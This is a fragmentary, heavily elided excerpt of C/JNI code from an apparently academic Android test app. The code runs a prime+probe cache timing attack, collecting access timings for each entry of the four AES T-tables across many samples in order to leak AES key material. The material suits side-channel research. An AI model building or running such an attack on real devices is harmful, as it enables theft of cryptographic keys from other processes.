...
uint64_t getPPTime(JNIEnv *env, libcache_session_t *libcache_session,
...
void getTestStatistic(JNIEnv *env, libcache_session_t *libcache_session,
...
jint Java_www_buaa_edu_cn_testlibcache_TestLibCache_callNativeLibCacheAttack(
  ...
  getTestStatistic(env, libcache_session, fpp, tmp);
  if (fpp != NULL)
    fclose(fpp);
  ...
  for (int i = 0; i < AES_SAMPLE_SUM; i++) {
    ...
    for (int j0 = 0; j0 < AES_TABLE_LENGTH; j0++) {
      sample[i]->t0_time[j0] =
          getPPTime(env, libcache_session, inaes, tmp, tables.t0_si[j0]);
    }
    for (int j1 = 0; j1 < AES_TABLE_LENGTH; j1++) {
      sample[i]->t1_time[j1] =
          getPPTime(env, libcache_session, inaes, tmp, tables.t1_si[j1]);
    }
    for (int j2 = 0; j2 < AES_TABLE_LENGTH; j2++) {
      sample[i]->t2_time[j2] =
          getPPTime(env, libcache_session, inaes, tmp, tables.t2_si[j2]);
    }
    for (int j3 = 0; j3 < AES_TABLE_LENGTH; j3++) {
      sample[i]->t3_time[j3] =
          getPPTime(env, libcache_session, inaes, tmp, tables.t3_si[j3]);
    }
    LOGI("%d", i);
  }
...
void getTestStatistic(JNIEnv *env, libcache_session_t *libcache_session,
  ...
  int accaddr = 0;
  int index = libcache_get_set_index(libcache_session, &accaddr);
  ...
  for (int k = 0; k < TEST_STATISTIC_SUM; k++) {
    ...
    for (int i = 0; i < AES_TMP; i++) {
      ...
      //libcache_access_memory(&accaddr);
